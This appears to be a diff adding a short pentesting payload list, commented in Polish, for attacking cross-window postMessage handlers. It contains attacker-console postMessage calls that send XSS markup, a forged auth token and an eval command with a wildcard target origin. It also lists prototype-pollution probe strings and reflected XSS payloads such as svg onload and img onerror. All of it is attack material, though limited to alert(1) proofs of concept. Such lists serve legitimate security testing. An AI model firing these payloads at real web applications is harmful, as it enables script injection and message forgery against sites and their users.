@@ -1,0 +1,15 @@
+# === Wysyłka postMessage z atakującego (uruchamiane w window.opener / iframe) ===
+# Wykonywane w konsoli atakującego — payloady do wysłania
+target.postMessage('<img src=x onerror=alert(1)>','*')
+target.postMessage({type:'auth',token:'attacker'},'*')
+target.postMessage(JSON.stringify({cmd:'eval',data:'alert(1)'}),'*')
+
+# === Stringi do detekcji listenera bez weryfikacji origin ===
+__proto__
+constructor
+{"type":"__proto__","value":1}
+
+# === Reflected payload — gdy aplikacja renderuje event.data ===
+<svg onload=alert(1)>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
